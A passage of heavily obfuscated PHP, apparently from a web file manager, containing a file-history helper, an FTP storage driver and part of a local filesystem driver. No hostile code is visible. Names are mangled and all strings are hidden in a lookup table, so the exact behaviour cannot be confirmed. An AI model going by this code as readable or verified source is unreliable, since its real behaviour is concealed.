get_path_this($¯Ñ‹ÒºÕ)); } public static function listData($ÑŞ¤ú´Î, $ÒÔ©òª´ = true) { $•æìı =& $_SERVER[¯µç›È¢]; if ($ÒÔ©òª´ && !IO::exist($ÑŞ¤ú´Î)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÑŞ¤ú´Î, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $åÊ°ŠÜ = self::pathHistory($ÑŞ¤ú´Î); $û¿¯¤‹´ = array($•æìı[1246] => $åÊ°ŠÜ . $•æìı[1233], $•æìı[1245] => rtrim(get_path_father($åÊ°ŠÜ), $•æìı[8]) . $•æìı[8], $•æìı[377] => array()); $š©İ°Ç€ = IO::getContent($û¿¯¤‹´[$•æìı[1246]]); if ($š©İ°Ç€) { $°ùüıø³ = json_decode($š©İ°Ç€, !0); if (is_array($°ùüıø³)) { $û¿¯¤‹´[$•æìı[377]] = $°ùüıø³; } } return $û¿¯¤‹´; } private static function saveData($˜¬ş€«¿, $³¶‡ËÓ) { $¦“‚±Æ =& $_SERVER[¯µç›È¢]; self::log($¦“‚±Æ[1249] . $˜¬ş€«¿ . $¦“‚±Æ[81] . count($³¶‡ËÓ), $¦“‚±Æ[769]); if ($³¶‡ËÓ) { return IO::setContent($˜¬ş€«¿, json_encode($³¶‡ËÓ)); } $–ˆˆù¢— = IO::pathFather($˜¬ş€«¿); IO::remove($˜¬ş€«¿); self::clearEmptyFolder($–ˆˆù¢—); return !0; } public static function clearEmptyFolder($˜çÒáñ©) { $ùµĞï¬« =& $_SERVER[¯µç›È¢]; if (trim($˜çÒáñ©, $ùµĞï¬«[8]) == trim(self::$_historyBase, $ùµĞï¬«[8])) { return; } $ÎôÕ³ÂÖ = IO::pathFather($˜çÒáñ©); $Çí÷ˆ– = IO::has($˜çÒáñ©, !0); if ($Çí÷ˆ–[$ùµĞï¬«[216]] > 0 || $Çí÷ˆ–[$ùµĞï¬«[217]] > 0) { return; } IO::remove($˜çÒáñ©); self::clearEmptyFolder($ÎôÕ³ÂÖ); } private static function getBasePath() { $ØŞœ­ÆÉ =& $_SERVER[¯µç›È¢]; $Ê°…Øãú = Model($ØŞœ­ÆÉ[1250])->get($ØŞœ­ÆÉ[1251]); if ($Ê°…Øãú) { if (!IO::exist($Ê°…Øãú)) { IO::mkdir($Ê°…Øãú); } if (get_path_this($Ê°…Øãú) == $ØŞœ­ÆÉ[1236]) { $ñÏØ½± = $ØŞœ­ÆÉ[1252] . rand_string(8); @rename($Ê°…Øãú, get_path_father($Ê°…Øãú) . $ØŞœ­ÆÉ[8] . $ñÏØ½±); $Ê°…Øãú = DATA_PATH . $ñÏØ½± . $ØŞœ­ÆÉ[8]; file_put_contents(DATA_PATH . $ØŞœ­ÆÉ[1253], $ØŞœ­ÆÉ[12]); Model($ØŞœ­ÆÉ[1250])->set($ØŞœ­ÆÉ[1251], $Ê°…Øãú); } return $Ê°…Øãú; } $Ê°…Øãú = DATA_PATH . $ØŞœ­ÆÉ[1252] . rand_string(8) . $ØŞœ­ÆÉ[8]; $Ê°…Øãú = IO::mkdir($Ê°…Øãú); $Ê°…Øãú = rtrim($Ê°…Øãú, $ØŞœ­ÆÉ[8]) . $ØŞœ­ÆÉ[8]; file_put_contents($Ê°…Øãú . $ØŞœ­ÆÉ[1253], $ØŞœ­ÆÉ[12]); file_put_contents(DATA_PATH . $ØŞœ­ÆÉ[1253], $ØŞœ­ÆÉ[12]); Model($ØŞœ­ÆÉ[1250])->set($ØŞœ­ÆÉ[1251], $Ê°…Øãú); return $Ê°…Øãú; } } goto d§±Í†º; bœ‘øºœóˆ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Ÿû¸ÊœÆ) { parent::__construct(); if (count($Ÿû¸ÊœÆ) > 0) { $this->_init($Ÿû¸ÊœÆ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($»Ö¼¢¾ú) { $éË¼Å¾š =& $_SERVER[¯µç›È¢]; global $config; $this->appCharset = $config[$éË¼Å¾š[1374]]; $this->systemCharset = $config[$éË¼Å¾š[1375]]; if (isset($»Ö¼¢¾ú[$éË¼Å¾š[1376]]) && $»Ö¼¢¾ú[$éË¼Å¾š[1376]]) { $this->systemCharset = $»Ö¼¢¾ú[$éË¼Å¾š[1376]]; } } public function iconvApp($É€º¹è) { return $this->iconvTo($É€º¹è, $this->systemCharset, $this->appCharset); } public function iconvSystem($É©®ñ´¶) { return $this->iconvTo($É©®ñ´¶, $this->appCharset, $this->systemCharset); } public function getPathOuter($¡ŸĞÚ›«) { $·¤³Ş½ê =& $_SERVER[¯µç›È¢]; $ƒá¤Çåø = $this->iconvApp($this->pathBase); $¡ŸĞÚ›« = $this->iconvApp($¡ŸĞÚ›«); if (substr($ƒá¤Çåø, 0, 2) == $·¤³Ş½ê[1377]) { $ƒá¤Çåø = BASIC_PATH . substr($ƒá¤Çåø, 2); } if (substr($¡ŸĞÚ›«, 0, 2) == $·¤³Ş½ê[1377]) { $¡ŸĞÚ›« = BASIC_PATH . substr($¡ŸĞÚ›«, 2); } $ƒá¤Çåø = KodIO::clear($ƒá¤Çåø); $¡ŸĞÚ›« = KodIO::clear($¡ŸĞÚ›«); $¡ŸĞÚ›« = substr($¡ŸĞÚ›«, strlen($ƒá¤Çåø)); if (empty($this->pathDriver)) { return $¡ŸĞÚ›«; } return $this->pathDriver . $·¤³Ş½ê[8] . ltrim($¡ŸĞÚ›«, $·¤³Ş½ê[8]); } private function _init($ûÈÕ²§è = array()) { $Œ¹Ÿãú =& $_SERVER[¯µç›È¢]; if (!function_exists($Œ¹Ÿãú[1378])) { throw new Exception(LNG($Œ¹Ÿãú[1379])); } $this->config = $ûÈÕ²§è; $this->charsetReset($ûÈÕ²§è); foreach ($ûÈÕ²§è as $®ÁŒ–ı¨ => $Ë§Õœ¬”) { if (isset($this->{$®ÁŒ–ı¨})) { $this->{$®ÁŒ–ı¨} = $Ë§Õœ¬”; } } return $this->_login($ûÈÕ²§è); } private function _login($˜Òúëû•) { $ÕÅõÛ™Ó =& $_SERVER[¯µç›È¢]; static $øÃ¤†Íí = array(); $Ñ²äû‡± = md5(json_encode($˜Òúëû•)); if (isset($øÃ¤†Íí[$Ñ²äû‡±])) { foreach ($øÃ¤†Íí[$Ñ²äû‡±] as $û±Å’¶É => $£ÍØºë) { $this->{$û±Å’¶É} = $£ÍØºë; } return !0; } $¹Èø«åÇ = parse_url(trim($this->server, $ÕÅõÛ™Ó[8])); $this->host = $¹Èø«åÇ[$ÕÅõÛ™Ó[188]]; $µº™÷‘‹ = isset($¹Èø«åÇ[$ÕÅõÛ™Ó[187]]) && $¹Èø«åÇ[$ÕÅõÛ™Ó[187]] == $ÕÅõÛ™Ó[1380] ? !0 : !1; $this->scheme = $µº™÷‘‹ ? $ÕÅõÛ™Ó[1381] : $ÕÅõÛ™Ó[1382]; $this->port = isset($¹Èø«åÇ[$ÕÅõÛ™Ó[189]]) ? $¹Èø«åÇ[$ÕÅõÛ™Ó[189]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¦É›ˆÆŠ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ãÆªòÏ = $this->pasv == $ÕÅõÛ™Ó[99] ? !0 : !1; @ftp_pasv($this->connect, $ãÆªòÏ); $øÃ¤†Íí[$Ñ²äû‡±] = array($ÕÅõÛ™Ó[1383] => $this->connect, $ÕÅõÛ™Ó[188] => $this->host, $ÕÅõÛ™Ó[187] => $this->scheme, $ÕÅõÛ™Ó[189] => $this->port); return $¦É›ˆÆŠ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($´Ø°’Œ, $ôÙ«¹Ø½ = '', $ûÅòÈ¡Ñ = REPEAT_RENAME) { if ($this->setContent($´Ø°’Œ, $ôÙ«¹Ø½)) { return $this->getPathOuter($´Ø°’Œ); } return !1; } public function mkdir($…ØŸ®ÍÛ, $“Âİ¹ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $…ØŸ®ÍÛ = $this->iconvSystem($…ØŸ®ÍÛ); if ($this->_isFolder($…ØŸ®ÍÛ) || @ftp_mkdir($this->connect, $…ØŸ®ÍÛ)) { return $this->getPathOuter($…ØŸ®ÍÛ); } if (!$this->mkdir($this->pathFather($…ØŸ®ÍÛ))) { return !1; } if ($…ØŸ®ÍÛ = @ftp_mkdir($this->connect, $…ØŸ®ÍÛ)) { return $this->getPathOuter($…ØŸ®ÍÛ); } return !1; } public function copyFile($À¼ñ¿ûƒ, $‰Æìî®¶) { if (!$this->_isconn()) { return !1; } $ÏÓÓ×“÷ = $this->pathThis($this->iconvSystem($À¼ñ¿ûƒ)); $ÒÛœ®¿Í = $this->tempFile($ÏÓÓ×“÷); $Çù¢øí• = $this->iconvApp($ÒÛœ®¿Í); $this->download($À¼ñ¿ûƒ, $Çù¢øí•); $¥°º×œª = $this->upload($‰Æìî®¶, $Çù¢øí•); $this->tempFileRemve($ÒÛœ®¿Í); return $¥°º×œª; } public function moveFile($İŸı§òô, $–˜®µÙ) { if (!$this->_isconn()) { return !1; } $İŸı§òô = $this->iconvSystem($İŸı§òô); $–˜®µÙ = $this->iconvSystem($–˜®µÙ); $ùì½éÑ = @ftp_rename($this->connect, $İŸı§òô, $–˜®µÙ); return $ùì½éÑ ? $this->getPathOuter($–˜®µÙ) : !1; } public function delFile($³ùËÍŞÛ) { if (!$this->_isconn()) { return !1; } $³ùËÍŞÛ = $this->iconvSystem($³ùËÍŞÛ); return @ftp_delete($this->connect, $³ùËÍŞÛ); } public function delFolder($ìöö±œ×) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ƒ‚’†Ç¼ = $­¨µ¼×ˆ = array(); $this->fileList($ìöö±œ×, $ƒ‚’†Ç¼, $­¨µ¼×ˆ, !0); $this->listItemCache = !0; foreach ($­¨µ¼×ˆ as $Úîà¸ï­) { $®îŠ»Óú = $this->iconvSystem($Úîà¸ï­[$_SERVER[¯µç›È¢][32]]); $‡è¬ò¤Ê = @ftp_delete($this->connect, $®îŠ»Óú); if (!$‡è¬ò¤Ê) { return !1; } } foreach ($ƒ‚’†Ç¼ as $®îŠ»Óú) { $®îŠ»Óú = $this->iconvSystem($®îŠ»Óú); $‡è¬ò¤Ê = @ftp_rmdir($this->connect, $®îŠ»Óú); if (!$‡è¬ò¤Ê) { return !1; } } $ìöö±œ× = $this->iconvSystem($ìöö±œ×); return @ftp_rmdir($this->connect, $ìöö±œ×); } public function rename($·¾È£º³, $‰¯£¹°º) { $¥³–ÙÏ =& $_SERVER[¯µç›È¢]; if (!$this->_isconn()) { return !1; } $˜ÛÈ›œ³ = $this->fileNameAuto($this->pathFather($·¾È£º³), $‰¯£¹°º); $˜ÛÈ›œ³ = $this->iconvSystem($˜ÛÈ›œ³); $·¾È£º³ = $this->iconvSystem($·¾È£º³); $´•ˆ¯ª = $this->pathFather($·¾È£º³); $İáôŒ§ = rtrim($´•ˆ¯ª, $¥³–ÙÏ[8]) . $¥³–ÙÏ[8] . $˜ÛÈ›œ³; $ß­®îó° = @ftp_rename($this->connect, $·¾È£º³, $İáôŒ§); $İáôŒ§ = $this->iconvApp($İáôŒ§); return $ß­®îó° ? $this->getPathOuter($İáôŒ§) : !1; } private function folderInfo($ÅĞªüÊ, $°—ô§÷Ä = false) { $Ğò¥ë’À =& $_SERVER[¯µç›È¢]; $¡ÎğÆìÃ = array($Ğò¥ë’À[32] => $this->pathThis($ÅĞªüÊ), $Ğò¥ë’À[88] => $this->getPathOuter($Ğò¥ë’À[8] . $ÅĞªüÊ), $Ğò¥ë’À[33] => $Ğò¥ë’À[89]); if ($°—ô§÷Ä) { return $¡ÎğÆìÃ; } $¡ÎğÆìÃ[$Ğò¥ë’À[207]] = $¡ÎğÆìÃ[$Ğò¥ë’À[96]] = 0; $¡ÎğÆìÃ[$Ğò¥ë’À[208]] = $¡ÎğÆìÃ[$Ğò¥ë’À[209]] = !0; return $¡ÎğÆìÃ; } private function fileInfo($ôøİù¬, $¯ŸÜ„Ş³ = false, $® ¢ÉŠ™ = array()) { $ò™Ä¿ôì =& $_SERVER[¯µç›È¢]; $Êõ™²Ë = array($ò™Ä¿ôì[32] => $this->pathThis($ôøİù¬), $ò™Ä¿ôì[88] => $this->getPathOuter($ò™Ä¿ôì[8] . $ôøİù¬), $ò™Ä¿ôì[33] => $ò™Ä¿ôì[206], $ò™Ä¿ôì[90] => isset($® ¢ÉŠ™[$ò™Ä¿ôì[90]]) ? $® ¢ÉŠ™[$ò™Ä¿ôì[90]] : 0, $ò™Ä¿ôì[181] => $this->ext($ôøİù¬)); if ($¯ŸÜ„Ş³) { return $Êõ™²Ë; } $Êõ™²Ë[$ò™Ä¿ôì[207]] = $Êõ™²Ë[$ò™Ä¿ôì[96]] = 0; $Êõ™²Ë[$ò™Ä¿ôì[208]] = $Êõ™²Ë[$ò™Ä¿ôì[209]] = !0; $Ë†Éàá = $this->iconvSystem($ôøİù¬); $Êõ™²Ë[$ò™Ä¿ôì[96]] = @ftp_mdtm($this->connect, $Ë†Éàá); if (empty($® ¢ÉŠ™)) { $® ¢ÉŠ™ = $this->objectMeta($ôøİù¬); if (!$® ¢ÉŠ™) { return $Êõ™²Ë; } } $Êõ™²Ë[$ò™Ä¿ôì[90]] = $® ¢ÉŠ™[$ò™Ä¿ôì[90]]; return $Êõ™²Ë; } public function size($·ãòâŠÅ) { $ë¶¶ú = $this->objectMeta($·ãòâŠÅ); return $ë¶¶ú ? $ë¶¶ú[$_SERVER[¯µç›È¢][90]] : 0; } public function info($–© ·ÁÜ) { if ($this->isFile($–© ·ÁÜ)) { return $this->fileInfo($–© ·ÁÜ, 0); } else { if ($this->isFolder($–© ·ÁÜ)) { return $this->folderInfo($–© ·ÁÜ); } } return !1; } private function fileList($â«öª©¿, &$€Úû€Û, &$É¿³´Õ„, $†Ú”Îâğ = false) { $ƒ–ÎÖƒø =& $_SERVER[¯µç›È¢]; $â«öª©¿ = $this->iconvSystem($â«öª©¿); if (!$this->isFolder($â«öª©¿)) { return !1; } @ftp_chdir($this->connect, $ƒ–ÎÖƒø[8]); $â«öª©¿ = rtrim($â«öª©¿, $ƒ–ÎÖƒø[8]) . $ƒ–ÎÖƒø[8]; check_abort(); $íŒ±’¾  = $this->listItemCache === !1 ? !1 : !0; $ÊëÙ‘ºÏ = @ftp_rawlist($this->connect, $â«öª©¿); if (!$ÊëÙ‘ºÏ) { $ÊëÙ‘ºÏ = array(); } $¡‘€‘„¸ = array($ƒ–ÎÖƒø[10] => 1, $ƒ–ÎÖƒø[1384] => 1); foreach ($ÊëÙ‘ºÏ as $Ÿƒü¦Æª) { $ìıùûú£ = $this->_listItem($Ÿƒü¦Æª); if ($ìıùûú£[0] == $ƒ–ÎÖƒø[776]) { continue; } $ä¤ñèÍ‚ = $ìıùûú£[8]; if (empty($ä¤ñèÍ‚) && $ä¤ñèÍ‚ !== $ƒ–ÎÖƒø[204] || isset($¡‘€‘„¸[$ä¤ñèÍ‚])) { continue; } $ä¤ñèÍ‚ = $this->iconvApp($â«öª©¿ . ltrim($ä¤ñèÍ‚, $ƒ–ÎÖƒø[8])); $üÁÁ¯¾· = array($ƒ–ÎÖƒø[32] => $ä¤ñèÍ‚, $ƒ–ÎÖƒø[33] => $ƒ–ÎÖƒø[206], $ƒ–ÎÖƒø[90] => $ìıùûú£[4]); if (substr($Ÿƒü¦Æª, 0, 1) == $ƒ–ÎÖƒø[1385]) { $üÁÁ¯¾·[$ƒ–ÎÖƒø[33]] = $ƒ–ÎÖƒø[89]; $üÁÁ¯¾·[$ƒ–ÎÖƒø[90]] = 0; } $Á×ø«Ìª = $üÁÁ¯¾·[$ƒ–ÎÖƒø[33]] == $ƒ–ÎÖƒø[89] ? !0 : !1; if ($íŒ±’¾ ) { $this->cacheMethod($ƒ–ÎÖƒø[212], $ä¤ñèÍ‚, $Á×ø«Ìª); $this->cacheMethod($ƒ–ÎÖƒø[213], $ä¤ñèÍ‚, $üÁÁ¯¾·); } if ($Á×ø«Ìª) { $€Úû€Û[] = $ä¤ñèÍ‚; if ($†Ú”Îâğ) { $this->fileList($ä¤ñèÍ‚, $€Úû€Û, $É¿³´Õ„, $†Ú”Îâğ); } continue; } $É¿³´Õ„[] = $üÁÁ¯¾·; } if ($íŒ±’¾ ) { $this->cacheMethod($ƒ–ÎÖƒø[212], $â«öª©¿, !0); } } private function _listItem($éÁ¤¤íÅ) { if (empty($éÁ¤¤íÅ)) { return array(); } $Ó£÷®ÌÒ = preg_split($_SERVER[¯µç›È¢][1386], $éÁ¤¤íÅ); if (count($Ó£÷®ÌÒ) <= 9) { return $Ó£÷®ÌÒ; } $Ó£÷®ÌÒ[8] = trim(substr($éÁ¤¤íÅ, strpos($éÁ¤¤íÅ, $Ó£÷®ÌÒ[7]) + strlen($Ó£÷®ÌÒ[7]))); return array_splice($Ó£÷®ÌÒ, 0, 9); } public function listPath($±É¶ä£½, $ûè€”– = false) { $Ğ”¨Ôá« =& $_SERVER[¯µç›È¢]; if (!$this->_isconn()) { return !1; } $„‡ŞùÚ = $Çì¬Òô§ = array(); $this->fileList($±É¶ä£½, $„‡ŞùÚ, $Çì¬Òô§); foreach ($„‡ŞùÚ as $–€Éñ‹ => $—ƒßãî) { $„‡ŞùÚ[$–€Éñ‹] = $this->folderInfo($—ƒßãî, $ûè€”–); } foreach ($Çì¬Òô§ as $–€Éñ‹ => $—ƒßãî) { $Çì¬Òô§[$–€Éñ‹] = $this->fileInfo($—ƒßãî[$Ğ”¨Ôá«[32]], $ûè€”–, $—ƒßãî); } return array($Ğ”¨Ôá«[87] => $„‡ŞùÚ, $Ğ”¨Ôá«[86] => $Çì¬Òô§); } public function has($¨ëªò÷, $¤µÄÙ†Š = false, $óÊô‘Ûû = true) { $Ñ¹üÙÉ— =& $_SERVER[¯µç›È¢]; $€÷¹ğ = $š½ÜÇ²Ğ = array(); $±îÌßŠ¦ = $¤µÄÙ†Š ? !0 : !1; $this->fileList($¨ëªò÷, $€÷¹ğ, $š½ÜÇ²Ğ, $±îÌßŠ¦); if ($¤µÄÙ†Š) { return array($Ñ¹üÙÉ—[216] => count($š½ÜÇ²Ğ), $Ñ¹üÙÉ—[217] => count($€÷¹ğ)); } if ($óÊô‘Ûû) { if (count($š½ÜÇ²Ğ)) { return !0; } } else { if (count($€÷¹ğ)) { return !0; } } return !1; } public function listAll($¼ïÚÌæ€) { $àòÚ´¥À =& $_SERVER[¯µç›È¢]; if (!$this->_isconn()) { return !1; } $—˜¸”¥ü = $ÏÖ¿ÎÕ© = array(); $this->fileList($¼ïÚÌæ€, $—˜¸”¥ü, $ÏÖ¿ÎÕ©, !0); $ö´Ä¼¼— = array(); foreach ($ÏÖ¿ÎÕ© as $Àƒ„æëø) { $ö´Ä¼¼—[$Àƒ„æëø[$àòÚ´¥À[32]]] = $Àƒ„æëø[$àòÚ´¥À[90]]; } foreach ($—˜¸”¥ü as $Àƒ„æëø) { if (is_string($Àƒ„æëø)) { $ö´Ä¼¼—[$Àƒ„æëø] = 0; } } return $this->listAllFiles($¼ïÚÌæ€, array_keys($ö´Ä¼¼—), $ö´Ä¼¼—); } public function getContent($üÀÎ’Ñ¹) { if (!$this->_isconn()) { return !1; } $üÀÎ’Ñ¹ = $this->iconvSystem($üÀÎ’Ñ¹); return $this->fileSubstr($üÀÎ’Ñ¹); } public function setContent($’‹°ûı”, $ÁŸ¿ú¥š = '') { if (!$this->_isconn()) { return !1; } $åî·¾Ğñ = $this->pathThis($this->iconvSystem($’‹°ûı”)); $”‚Ë¾œ± = $this->tempFile($åî·¾Ğñ); file_put_contents($”‚Ë¾œ±, $ÁŸ¿ú¥š); $âü²º¾Ê = $this->upload($’‹°ûı”, $this->iconvApp($”‚Ë¾œ±)); $this->tempFileRemve($”‚Ë¾œ±); return $âü²º¾Ê; } public function fileSubstr($Äªºø‚, $í²ùã¬¦ = 0, $§ĞÙ€µ¥ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Äªºø‚, $í²ùã¬¦, $§ĞÙ€µ¥); } private function ftpRequest($êªÚ¼»×, $÷‡…ôğ = 0, $ªñ“á¹ = false) { $êªÚ¼»× = $this->iconvSystem($êªÚ¼»×); $ƒ Õ ú = $this->scheme . $this->host . $_SERVER[¯µç›È¢][4] . $this->port; $é‘Æà = curl_init(); curl_setopt($é‘Æà, CURLOPT_URL, $ƒ Õ ú . $this->pathEncode($êªÚ¼»×)); curl_setopt($é‘Æà, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ªñ“á¹) { $ƒÖ×Õ = $÷‡…ôğ + $ªñ“á¹ - 1; curl_setopt($é‘Æà, CURLOPT_RANGE, "{$÷‡…ôğ}\55{$ƒÖ×Õ}"); } curl_setopt($é‘Æà, CURLOPT_RETURNTRANSFER, 1); $œÕú¥ö¶ = curl_exec($é‘Æà); curl_close($é‘Æà); return $œÕú¥ö¶; } public function upload($´Û™·•¾, $êÙ¤€—‰, $şæ›¶°Œ = false, $…ŞØ³™™ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($´Û™·•¾))) { return !1; } $´Û™·•¾ = $this->iconvSystem($´Û™·•¾); $êÙ¤€—‰ = $this->iconvSystem($êÙ¤€—‰); $„ÒˆÙ©¦ = ftp_nb_put($this->connect, $´Û™·•¾, $êÙ¤€—‰, FTP_BINARY); while ($„ÒˆÙ©¦ == FTP_MOREDATA) { $„ÒˆÙ©¦ = ftp_nb_continue($this->connect); } if ($„ÒˆÙ©¦ != FTP_FINISHED) { return !1; } return $this->getPathOuter($´Û™·•¾); } public function download($¡ĞËœ˜ı, $¿¾Äëü÷ = '') { if (!$this->_isconn()) { return !1; } $Ÿ¬Ú§ı = $this->pathFather($¿¾Äëü÷); if (!IO::mkdir($Ÿ¬Ú§ı)) { return !1; } $¡ĞËœ˜ı = $this->iconvSystem($¡ĞËœ˜ı); $¿¾Äëü÷ = $this->iconvSystem($¿¾Äëü÷); $òÏÙ…æ‡ = ftp_nb_get($this->connect, $¿¾Äëü÷, $¡ĞËœ˜ı, FTP_BINARY); while ($òÏÙ…æ‡ == FTP_MOREDATA) { $òÏÙ…æ‡ = ftp_nb_continue($this->connect); } if ($òÏÙ…æ‡ != FTP_FINISHED) { return !1; } return $this->iconvApp($¿¾Äëü÷); } public function exist($ñÁÚÓèÚ) { return $this->isFile($ñÁÚÓèÚ) || $this->isFolder($ñÁÚÓèÚ); } public function isFile($ìû³ÍÔ) { return !$this->isFolder($ìû³ÍÔ) && $this->objectMeta($ìû³ÍÔ); } public function isFolder($ŒŞÏ¦İ) { return $this->cacheMethod($_SERVER[¯µç›È¢][212], $ŒŞÏ¦İ); } protected function objectMeta($Ó‡‹õ¯Î) { return $this->cacheMethod($_SERVER[¯µç›È¢][213], $Ó‡‹õ¯Î); } protected function _objectMeta($ƒì ­¼ğ) { $…†ª²†¨ =& $_SERVER[¯µç›È¢]; if ($ƒì ­¼ğ == $…†ª²†¨[12] || $ƒì ­¼ğ == $…†ª²†¨[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ƒì ­¼ğ = $this->iconvSystem($ƒì ­¼ğ); $Ù°•ç×û = array($…†ª²†¨[32] => $this->iconvApp($ƒì ­¼ğ), $…†ª²†¨[33] => $…†ª²†¨[206], $…†ª²†¨[90] => 0); @ftp_chdir($this->connect, $…†ª²†¨[8]); $ÌãŸëÈÈ = @ftp_size($this->connect, $ƒì ­¼ğ); if ($ÌãŸëÈÈ != -1) { $Ù°•ç×û[$…†ª²†¨[90]] = $ÌãŸëÈÈ; } else { $˜½ôÏ†¸ = @ftp_chdir($this->connect, $ƒì ­¼ğ); if (!$˜½ôÏ†¸) { return !1; } $Ù°•ç×û[$…†ª²†¨[33]] = $…†ª²†¨[89]; } return $Ù°•ç×û; } protected function _isFolder($Šç¸­’î) { $òå¶ñ©š =& $_SERVER[¯µç›È¢]; if ($Šç¸­’î == $òå¶ñ©š[12] || $Šç¸­’î == $òå¶ñ©š[8]) { return !0; } $©³‰€Ú = $this->_objectMeta($Šç¸­’î); return isset($©³‰€Ú[$òå¶ñ©š[33]]) && $©³‰€Ú[$òå¶ñ©š[33]] == $òå¶ñ©š[89] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($€ÁÑœ¼) { if (substr($€ÁÑœ¼, 0, 2) == $_SERVER[¯µç›È¢][1377]) { $€ÁÑœ¼ = BASIC_PATH . substr($€ÁÑœ¼, 2); } return $€ÁÑœ¼; } public function iconvApp($äŸ¦Âó§) { $Ø“‹ò¶ =& $_SERVER[¯µç›È¢]; global $config; return $this->iconvTo($äŸ¦Âó§, $config[$Ø“‹ò¶[1375]], $config[$Ø“‹ò¶[1374]]); } public function iconvSystem($ìŸò—å) { $¬ÈÊ¿şè =& $_SERVER[¯µç›È¢]; global $config; return $this->iconvTo($ìŸò—å, $config[$¬ÈÊ¿şè[1374]], $config[$¬ÈÊ¿şè[1375]]); } public function getPathOuter($¼ŒÅÕ©ò) { $ÀÓÔò‰ê =& $_SERVER[¯µç›È¢]; $°ğ–’ƒ = $this->iconvApp($this->pathBase); $¼ŒÅÕ©ò = $this->iconvApp($¼ŒÅÕ©ò); if (substr($°ğ–’ƒ, 0, 2) == $ÀÓÔò‰ê[1377]) { $°ğ–’ƒ = BASIC_PATH . substr($°ğ–’ƒ, 2); } if (substr($¼ŒÅÕ©ò, 0, 2) == $ÀÓÔò‰ê[1377]) { $¼ŒÅÕ©ò = BASIC_PATH . substr($¼ŒÅÕ©ò, 2); } $°ğ–’ƒ = KodIO::clear($°ğ–’ƒ); $¼ŒÅÕ©ò = KodIO::clear($¼ŒÅÕ©ò); $¼ŒÅÕ©ò = substr($¼ŒÅÕ©ò, strlen($°ğ–’ƒ)); if (empty($this->pathDriver)) { return $¼ŒÅÕ©ò; } return $this->pathDriver . $ÀÓÔò‰ê[8] . ltrim($¼ŒÅÕ©ò, $ÀÓÔò‰ê[8]); } public function mkfile($æÜ–š», $ä“öÓÍ¯ = '', $ç´ô¦íš = REPEAT_RENAME) { $æÜ–š» = $this->iconvSystem($æÜ–š»); @touch($æÜ–š»); if ($ä“öÓÍ¯) { file_put_contents($æÜ–š», $ä“öÓÍ¯); } @chmod($æÜ–š», $this->pathAuth); return is_file($æÜ–š») ? $this->getPathOuter($æÜ–š») : !1; } public function mkdir($ìœ–Øâ¿, $Ÿ•Ø¨ñó = REPEAT_SKIP) { $ìœ–Øâ¿ = $this->iconvSystem($ìœ–Øâ¿); if (is_dir($ìœ–Øâ¿)) { return $this->getPathOuter($ìœ–Øâ¿); } @mkdir($ìœ–Øâ¿, $this->pathAuth, !0); @chmod($ìœ–Øâ¿, $this->pathAuth); return is_dir($ìœ–Øâ¿) ? $this->getPathOuter($ìœ–Øâ¿) : !1; } public function copyFile($ó¸Æ¿Ğ, $›ÖìÙ²¢) { $this->mkdir($this->pathFather($›ÖìÙ²¢)); $ó¸Æ¿Ğ = $this->iconvSystem($ó¸Æ¿Ğ); $›ÖìÙ²¢ = $this->iconvSystem($›ÖìÙ²¢); $°µ¦Áçø = copy_64($ó¸Æ¿Ğ, $›ÖìÙ²¢); @chmod($›ÖìÙ²¢, $this->pathAuth); return $°µ¦Áçø ? $this->getPathOuter($›ÖìÙ²¢) : !1; } public function moveFile($ë¦€ğ¿õ, $ÃšÚ¢îÙ) { $this->mkdir($this->pathFather($ÃšÚ¢îÙ)); $ë¦€ğ¿õ = $this->iconvSystem($ë¦€ğ¿õ); $ÃšÚ¢îÙ = $this->iconvSystem($ÃšÚ¢îÙ); $÷—ÊèÀÑ = intval(@rename($ë¦€ğ¿õ, $ÃšÚ¢îÙ)); if (!$÷—ÊèÀÑ) { if ($÷—ÊèÀÑ = intval(@copy_64($ë¦€ğ¿õ, $ÃšÚ¢îÙ))) { @unlink($ë¦€ğ¿õ); } } @chmod($ÃšÚ¢îÙ, $this->pathAuth); return $÷—ÊèÀÑ ? $this->getPathOuter($ÃšÚ¢îÙ) : !1; } public function movePath($¥çºğ×, $«à™‰Å‡, $Á‘ŒØ® = false) { $¢ İ†µ£ =& $_SERVER[¯µç›È¢]; $¥çºğ× = $this->iconvSystem($¥çºğ×); $«à™‰Å‡ = $this->iconvSystem($«à™‰Å‡); $Ñì›“İ = rtrim($«à™‰Å‡, $¢ İ†µ£[8]) . $¢ İ†µ£[8] . ($Á‘ŒØ® ? $Á‘ŒØ® : get_path_this($¥çºğ×)); if (file_exists($Ñì›“İ)) { return !1; } $ñ­Æ×®ü = intval(@rename($¥çºğ×, $Ñì›“İ)); $ñ­Æ×®ü = file_exists($Ñì›“İ); return $ñ­Æ×®ü ? $this->getPathOuter($Ñì›“İ) : !1; } public function delFile($ü ¾ƒ´¿) { $ü ¾ƒ´¿ = $this->iconvSystem($ü ¾ƒ´¿); if (!@unlink($ü ¾ƒ´¿)) { @chmod($ü ¾ƒ´¿, $this->pathAuth); if (!@unlink($ü ¾ƒ´¿)) { return !1; } } else { return !0; } } public function delFolder($£É´Å±É) { $«±ã“ =& $_SERVER[¯µç›È¢]; $£É´Å±É = $this->iconvSystem($£É´Å±É); if (!is_dir($£É´Å±É)) { return !0; } if (!($¯‰œ­Ÿ = opendir($£É´Å±É))) { return !1; } while (($Šˆê¾¸î = readdir($¯‰œ­Ÿ)) 